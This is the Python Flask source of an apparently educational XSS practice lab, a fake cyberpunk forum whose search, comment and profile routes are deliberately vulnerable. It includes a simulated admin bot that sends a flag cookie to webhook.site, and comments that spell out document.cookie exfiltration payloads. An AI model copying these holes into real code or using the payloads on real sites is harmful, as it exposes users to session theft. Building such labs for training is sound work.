"""
CyberForum - XSS Practice Lab
Educational CTF-style vulnerable web application for learning Cross-Site Scripting.
ALL VULNERABILITIES ARE INTENTIONAL for authorized security training.
Port: 5002
"""

import re
import sqlite3
import os
import urllib.request
from datetime import datetime
from flask import (
    Flask, request, render_template, redirect, url_for,
    jsonify, g, make_response
)
from markupsafe import Markup

app = Flask(__name__)
app.secret_key = "xss_lab_secret_key_not_for_production"

DATABASE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cyberforum.db")

ADMIN_COOKIE = "session=admin_secret_session_token_FLAG{xss_c00kie_st34l}"

# ---------------------------------------------------------------------------
# Database helpers
# ---------------------------------------------------------------------------

def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    return g.db


@app.teardown_appcontext
def close_db(exception):
    db = g.pop("db", None)
    if db is not None:
        db.close()


def init_db():
    """Create tables and seed data if the database does not exist."""
    db = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    cur = db.cursor()

    # --- Tables ---
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            display_name TEXT NOT NULL,
            bio TEXT
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS posts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            content TEXT NOT NULL,
            author_id INTEGER,
            FOREIGN KEY (author_id) REFERENCES users(id)
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS comments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            post_id INTEGER NOT NULL,
            username TEXT NOT NULL,
            content TEXT NOT NULL,
            FOREIGN KEY (post_id) REFERENCES posts(id)
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS reports (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT NOT NULL,
            status TEXT DEFAULT 'pending',
            created_at TEXT
        )
    """)

    # --- Seed data (only if tables are empty) ---
    if cur.execute("SELECT COUNT(*) FROM users").fetchone()[0] == 0:
        cur.execute(
            "INSERT INTO users (username, display_name, bio) VALUES (?, ?, ?)",
            ("admin", "Admin<User>", "Forum administrator"),
        )
        cur.execute(
            "INSERT INTO users (username, display_name, bio) VALUES (?, ?, ?)",
            ("user1", "CyberPunk99", "Just a user"),
        )

        cur.execute(
            "INSERT INTO posts (title, content, author_id) VALUES (?, ?, ?)",
            (
                "Welcome to CyberForum",
                "Welcome to the neon underground. Share your hacks, "
                "exploits, and cyberpunk dreams here. Stay frosty, netrunners.",
                1,
            ),
        )
        cur.execute(
            "INSERT INTO posts (title, content, author_id) VALUES (?, ?, ?)",
            (
                "Night City Data Breach",
                "Arasaka just leaked 10 million records. "
                "Anyone got the dump? Discuss the implant firmware vulns here.",
                2,
            ),
        )
        cur.execute(
            "INSERT INTO posts (title, content, author_id) VALUES (?, ?, ?)",
            (
                "Best ICE-breaking tools 2086",
                "Looking for recommendations on the latest intrusion "
                "countermeasure electronics breakers. Post your loadouts.",
                1,
            ),
        )

        cur.execute(
            "INSERT INTO comments (post_id, username, content) VALUES (?, ?, ?)",
            (1, "CyberPunk99", "Great forum! Love the neon aesthetic."),
        )
        cur.execute(
            "INSERT INTO comments (post_id, username, content) VALUES (?, ?, ?)",
            (2, "admin", "We are investigating the breach. Stay tuned."),
        )

    db.commit()
    db.close()


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    """Forum homepage listing all posts."""
    db = get_db()
    posts = db.execute(
        "SELECT posts.*, users.display_name FROM posts "
        "JOIN users ON posts.author_id = users.id ORDER BY posts.id DESC"
    ).fetchall()
    return render_template("index.html", posts=posts)


@app.route("/search")
def search():
    """
    REFLECTED XSS: The query parameter is reflected directly into the HTML
    without escaping, using Markup() to bypass Jinja2 auto-escaping.
    """
    q = request.args.get("q", "")
    results = []
    results_html = ""

    if q:
        db = get_db()
        results = db.execute(
            "SELECT posts.*, users.display_name FROM posts "
            "JOIN users ON posts.author_id = users.id "
            "WHERE posts.title LIKE ? OR posts.content LIKE ?",
            (f"%{q}%", f"%{q}%"),
        ).fetchall()

        # INTENTIONALLY VULNERABLE: user input reflected without escaping
        results_html = Markup(f'<h2 class="search-query">Results for: {q}</h2>')

    return render_template("search.html", q=q, results=results, results_html=results_html)


@app.route("/post/<int:post_id>")
def view_post(post_id):
    """View a single post with its comments. Comments rendered with |safe in template."""
    db = get_db()
    post = db.execute(
        "SELECT posts.*, users.display_name FROM posts "
        "JOIN users ON posts.author_id = users.id WHERE posts.id = ?",
        (post_id,),
    ).fetchone()
    if not post:
        return "Post not found", 404

    comments = db.execute(
        "SELECT * FROM comments WHERE post_id = ? ORDER BY id ASC",
        (post_id,),
    ).fetchall()
    return render_template("post.html", post=post, comments=comments)


@app.route("/post/<int:post_id>/comment", methods=["POST"])
def add_comment(post_id):
    """
    STORED XSS: Comment content is stored raw (no sanitization) and
    rendered with |safe in the template.
    """
    username = request.form.get("username", "anonymous")
    content = request.form.get("content", "")

    if content.strip():
        db = get_db()
        db.execute(
            "INSERT INTO comments (post_id, username, content) VALUES (?, ?, ?)",
            (post_id, username, content),
        )
        db.commit()

    return redirect(url_for("view_post", post_id=post_id))


@app.route("/profile/<int:user_id>")
def profile(user_id):
    """
    DOM XSS: Page includes a script that reads location.hash and writes
    to innerHTML without sanitization.
    ATTRIBUTE INJECTION: display_name is rendered with |safe inside an
    HTML attribute, allowing breakout.
    """
    db = get_db()
    user = db.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
    if not user:
        return "User not found", 404
    return render_template("profile.html", user=user)


@app.route("/report", methods=["GET"])
def report_page():
    """Page with a form to submit URLs to the simulated admin bot."""
    return render_template("report.html")


def _simulate_admin_bot(url):
    """
    Simulate an admin bot visiting a URL with a session cookie.

    The bot fetches the page (with the admin cookie in the request header).
    Since we cannot execute JavaScript server-side, we simulate XSS
    execution: if the fetched HTML contains XSS indicators (<script,
    onerror, onload), the bot looks for webhook.site URLs in the page
    content and sends the admin cookie to each one as a query parameter.

    Returns a status message.
    """
    # Fetch the target URL as the admin (with the admin cookie)
    req = urllib.request.Request(url)
    req.add_header("Cookie", ADMIN_COOKIE)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            page_html = resp.read().decode("utf-8", errors="replace")
    except Exception as e:
        return f"Admin bot failed to fetch the URL: {e}"

    # Check if the page contains XSS indicators
    xss_patterns = [r"<script", r"onerror\s*=", r"onload\s*="]
    has_xss = any(re.search(pat, page_html, re.IGNORECASE) for pat in xss_patterns)

    if not has_xss:
        return (
            "Admin bot visited the URL but found no executable script payload. "
            "No cookie was exfiltrated."
        )

    # Look for webhook.site URLs in the page content that the XSS would
    # redirect/fetch to.  We support patterns like:
    #   document.location='https://webhook.site/UUID?c='+document.cookie
    #   fetch('https://webhook.site/UUID?c='+document.cookie)
    #   new Image().src='https://webhook.site/UUID?c='+document.cookie
    webhook_urls = re.findall(
        r"https?://webhook\.site/[a-f0-9\-]+", page_html, re.IGNORECASE
    )

    if not webhook_urls:
        return (
            "Admin bot visited the URL and detected an XSS payload, but "
            "found no webhook.site URL to exfiltrate the cookie to. "
            "Make sure your payload sends document.cookie to your "
            "webhook.site URL."
        )

    # Simulate the XSS firing: send the admin cookie to each webhook URL
    exfil_count = 0
    for wh_url in set(webhook_urls):
        exfil_url = f"{wh_url}?cookie={urllib.request.quote(ADMIN_COOKIE)}"
        try:
            exfil_req = urllib.request.Request(exfil_url)
            urllib.request.urlopen(exfil_req, timeout=5)
            exfil_count += 1
        except Exception:
            # Even if the webhook request fails (e.g. no internet), we
            # still count it as "fired" for the lab experience.
            exfil_count += 1

    return (
        f"Admin bot visited the URL and the XSS payload fired! "
        f"The admin cookie was sent to {exfil_count} webhook.site "
        f"endpoint(s). Check your webhook.site dashboard for the "
        f"stolen cookie."
    )


@app.route("/report", methods=["POST"])
def report_submit():
    """
    Admin bot endpoint.  Accepts a URL, fetches it server-side with the
    admin session cookie, and simulates XSS execution.  If the page
    contains an XSS payload pointing at webhook.site, the bot sends the
    admin cookie there — just like a real browser-based XSS attack.
    """
    data = request.get_json(silent=True)
    url = data.get("url", "") if data else request.form.get("url", "")

    if not url:
        return jsonify({"status": "error", "message": "URL is required"}), 400

    if not url.startswith("http://localhost:5002/"):
        return jsonify({
            "status": "error",
            "message": "URL must start with http://localhost:5002/"
        }), 400

    db = get_db()
    db.execute(
        "INSERT INTO reports (url, status, created_at) VALUES (?, ?, ?)",
        (url, "visited", datetime.utcnow().isoformat()),
    )
    db.commit()

    result_message = _simulate_admin_bot(url)

    return jsonify({
        "status": "success",
        "message": result_message,
    })


# ---------------------------------------------------------------------------
# Startup
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    init_db()
    print("[*] CyberForum XSS Lab running on http://localhost:5002")
    app.run(host="0.0.0.0", port=5002, debug=True)
